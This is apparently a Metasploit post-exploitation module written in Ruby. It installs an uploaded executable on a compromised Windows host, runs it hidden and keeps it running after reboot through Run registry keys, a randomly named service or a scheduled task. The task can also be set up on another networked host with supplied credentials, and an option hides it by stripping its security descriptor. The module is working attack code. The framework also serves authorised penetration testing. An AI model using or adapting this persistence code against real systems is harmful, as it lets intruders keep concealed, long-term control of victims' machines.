##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::TaskScheduler

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Persistent EXE Payload Installer',
        'Description' => %q{
          This Module will upload an executable to a remote host and make it Persistent.
          It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,
          SYSTEM will start on system boot but requires privs. SERVICE will create a new service
          which will start the payload. Again requires privs.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Merlyn drforbin Cousins <drforbin6[at]gmail.com>' ],
        'Version' => '$Revision:1$',
        'Platform' => [ 'windows' ],
        'SessionTypes' => [ 'meterpreter'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_sys_config_getenv
              stdapi_sys_config_sysinfo
              stdapi_sys_process_execute
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES],
          'SideEffects' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER', 'SYSTEM', 'SERVICE', 'TASK']]),
        OptPath.new('REXEPATH', [true, 'The remote executable to upload and execute.']),
        OptString.new('REXENAME', [true, 'The name to call exe on remote system', 'default.exe']),
        OptBool.new('RUN_NOW', [false, 'Run the installed payload immediately.', true]),
      ], self.class
    )

    register_advanced_options(
      [
        OptString.new('LocalExePath', [false, 'The local exe path to run. Use temp directory as default. ']),
        OptString.new('RemoteExePath', [
          false,
          'The remote path to move the payload to. Only valid when the STARTUP option is set '\
          'to TASK and the ScheduleRemoteSystem option is set. Use the same path than LocalExePath '\
          'if not set.'
        ]),
        OptString.new('StartupName', [false, 'The name of service, registry or scheduled task. Random string as default.' ]),
        OptString.new('ServiceDescription', [false, 'The description of service. Random string as default.' ])
      ]
    )
  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def run
    print_status("Running module against #{sysinfo['Computer']}")

    # Set vars
    rexe = datastore['REXEPATH']
    rexename = datastore['REXENAME']
    host, _port = session.tunnel_peer.split(':')
    @clean_up_rc = ''

    raw = create_payload_from_file rexe

    # Write script to %TEMP% on target
    script_on_target = write_exe_to_target(raw, rexename)

    # Initial execution of script
    target_exec(script_on_target) if datastore['RUN_NOW']

    case datastore['STARTUP'].upcase
    when 'USER'
      write_to_reg('HKCU', script_on_target)
    when 'SYSTEM'
      write_to_reg('HKLM', script_on_target)
    when 'SERVICE'
      install_as_service(script_on_target)
    when 'TASK'
      create_scheduler_task(script_on_target)
    end

    clean_rc = log_file
    file_local_write(clean_rc, @clean_up_rc)
    print_status("Cleanup Meterpreter RC File: #{clean_rc}")

    report_note(host: host,
                type: 'host.persistance.cleanup',
                data: {
                  local_id: session.sid,
                  stype: session.type,
                  desc: session.info,
                  platform: session.platform,
                  via_payload: session.via_payload,
                  via_exploit: session.via_exploit,
                  created_at: Time.now.utc,
                  commands: @clean_up_rc
                })
  end

  # Function for creating log folder and returning log path
  #-------------------------------------------------------------------------------
  def log_file(log_path = nil)
    # Get hostname
    if datastore['STARTUP'] == 'TASK' && @cleanup_host
      # Use the remote hostname when remote task creation is selected
      # Cleanup will have to be performed on this remote host
      host = @cleanup_host
    else
      host = session.sys.config.sysinfo['Computer']
    end

    # Create Filename info to be appended to downloaded files
    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')

    # Create a directory for the logs
    logs = if log_path
             ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))
           else
             ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))
           end

    # Create the log directory
    ::FileUtils.mkdir_p(logs)

    # logfile name
    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + '.rc'
    logfile
  end

  # Function to execute script on target and return the PID of the process
  #-------------------------------------------------------------------------------
  def target_exec(script_on_target)
    print_status("Executing script #{script_on_target}")
    proc = session.sys.process.execute(script_on_target, nil, 'Hidden' => true)
    print_good("Agent executed with PID #{proc.pid}")
    @clean_up_rc << "kill #{proc.pid}\n"
    proc.pid
  end

  # Function to install payload in to the registry HKLM or HKCU
  #-------------------------------------------------------------------------------
  def write_to_reg(key, script_on_target)
    nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8..15))
    print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
    if key
      registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", nam, script_on_target, 'REG_SZ')
      print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
      @clean_up_rc << "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v '#{nam}'\n"
    else
      print_error('Error: failed to open the registry key for writing')
    end
  end

  # Function to install payload as a service
  #-------------------------------------------------------------------------------
  def install_as_service(script_on_target)
    if is_system? || is_admin?
      print_status('Installing as service..')
      nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8..15))
      description = datastore['ServiceDescription'] || Rex::Text.rand_text_alpha(8)
      print_status("Creating service #{nam}")

      key = service_create(nam, path: "cmd /c \"#{script_on_target}\"", display: description)

      # check if service had been created
      if key != 0
        print_error("Service #{nam} creating failed.")
        return
      end

      # if service is stopped, then start it.
      service_start(nam) if datastore['RUN_NOW'] && service_status(nam)[:state] == 1

      @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
    else
      print_error('Insufficient privileges to create service')
    end
  end

  # Function for writing executable to target host
  #-------------------------------------------------------------------------------
  def write_exe_to_target(rexe, rexename)
    # check if we have write permission
    # I made it by myself because the function filestat.writable? was not implemented yet.
    if !datastore['LocalExePath'].nil?

      begin
        temprexe = datastore['LocalExePath'] + '\\' + rexename
        write_file_to_target(temprexe, rexe)
      rescue Rex::Post::Meterpreter::RequestError
        print_warning("Insufficient privileges to write in #{datastore['LocalExePath']}, writing to %TEMP%")
        temprexe = session.sys.config.getenv('TEMP') + '\\' + rexename
        write_file_to_target(temprexe, rexe)
      end

    # Write to %temp% directory if not set LocalExePath
    else
      temprexe = session.sys.config.getenv('TEMP') + '\\' + rexename
      write_file_to_target(temprexe, rexe)
    end

    print_good("Persistent Script written to #{temprexe}")
    @clean_up_rc << "rm #{temprexe.gsub('\\', '\\\\\\\\')}\n"
    temprexe
  end

  def write_file_to_target(temprexe, rexe)
    fd = session.fs.file.new(temprexe, 'wb')
    fd.write(rexe)
    fd.close
  end

  # Function to create executable from a file
  #-------------------------------------------------------------------------------
  def create_payload_from_file(exec)
    print_status("Reading Payload from file #{exec}")
    File.binread(exec)
  end

  def execute_cmd(cmd)
    verification_token = Rex::Text.rand_text_alphanumeric(8)
    result = cmd_exec("cmd /c #{cmd} & if not errorlevel 1 echo #{verification_token}")
    result.include?(verification_token)
  end

  def move_to_remote(remote_host, script_on_target, remote_path)
    print_status("Moving payload file to the remote host (#{remote_host})")

    # Translate local path to remote path. Basically, change any "<drive letter>:" to "<drive letter>$"
    remote_path = remote_path.split('\\')
    remote_exe = remote_path.pop
    remote_path[0].sub!(/^(?<drive>[A-Z]):/i, '\k<drive>$') unless remote_path.empty?
    remote_path.prepend(remote_host)
    remote_path = "\\\\#{remote_path.join('\\')}"

    result = execute_cmd("net use #{remote_path} /user:#{datastore['ScheduleUsername']} #{datastore['SchedulePassword']}")
    unless result
      print_error("Unable to connect to the remote host: #{result}")
      return false
    end

    # #move_file helper does not work when the target is a remote host and the session run as SYSTEM. It works with #cmd_exec.
    result = execute_cmd("move \"#{script_on_target}\" \"#{remote_path}\\#{remote_exe}\"")
    if result
      print_good("Moved #{script_on_target} to #{remote_path}\\#{remote_exe}")
    else
      print_error('Unable to move the file to the remote host')
    end

    unless execute_cmd("net use #{remote_path} /delete")
      print_warning('Unable to close the network connection with the remote host. This will have to be done manually')
    end

    return !!result
  end

  TaskSch = Msf::Post::Windows::TaskScheduler

  def create_scheduler_task(script_on_target)
    unless is_system? || is_admin?
      print_error('Insufficient privileges to create a scheduler task')
      return
    end

    remote_host = datastore['ScheduleRemoteSystem']
    print_status("Creating a #{datastore['ScheduleType']} scheduler task#{" on #{remote_host}" unless remote_host.nil?}")

    unless remote_host.nil?
      remote_path = script_on_target
      remote_path = "#{datastore['RemoteExePath']}\\#{datastore['REXENAME']}" if datastore['RemoteExePath']
      return false unless move_to_remote(remote_host, script_on_target, remote_path)

      @cleanup_host = remote_host
      @clean_up_rc = "rm #{remote_path.gsub('\\', '\\\\\\\\')}\n"
    end

    task_name = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8..15))
    print_status(
      "Creating task '#{task_name}'"\
      "#{' and removing the Security Descriptor registry key value to hide the task' if datastore['ObfuscateTask']}"
    )
    if datastore['ScheduleRemoteSystem']
      if Rex::Socket.dotted_ip?(datastore['ScheduleRemoteSystem'])
        print_warning(
          "The task will be created on the remote host #{datastore['ScheduleRemoteSystem']} and since "\
          'the FQDN is not used, it usually takes some time (> 1 min) due to some DNS resolution'\
          ' happening in the background'
        )
        if datastore['ObfuscateTask']
          print_warning(
            'Also, since the \'ObfuscateTask\' option has been set, it will take much more time '\
            'to be executed on the remote host for the same reasons (> 3 min). Don\'t Ctrl-C, even '\
            'if a session pops up, be patient or use a FQDN in `ScheduleRemoteSystem` option.'
          )
        end
      end
      @clean_up_rc = "# The 'rm' command won t probably succeed while you're interacting with the session\n"\
                     "# You should migrate to another process to be able to remove the payload file\n"\
                     "#{@clean_up_rc}"
    end

    begin
      task_create(task_name, remote_host.nil? ? script_on_target : remote_path)
    rescue TaskSchedulerError => e
      print_error("Task creation error: #{e}")
    end
    print_good('Task created!')

    if datastore['ObfuscateTask']
      @clean_up_rc << "reg setval -k '#{TaskSch::TASK_REG_KEY.gsub('\\') { '\\\\' }}\\#{task_name}' "\
                      "-v '#{TaskSch::TASK_SD_REG_VALUE}' "\
                      "-d '#{TaskSch::DEFAULT_SD.unpack('C*').map { |v| v.ord.to_s(16).rjust(2, '0') }.join}' "\
                      "-t 'REG_BINARY'\n"
    end
    @clean_up_rc << "execute -H -f schtasks -a \"/delete /tn #{task_name} /f\"\n"
  end
end
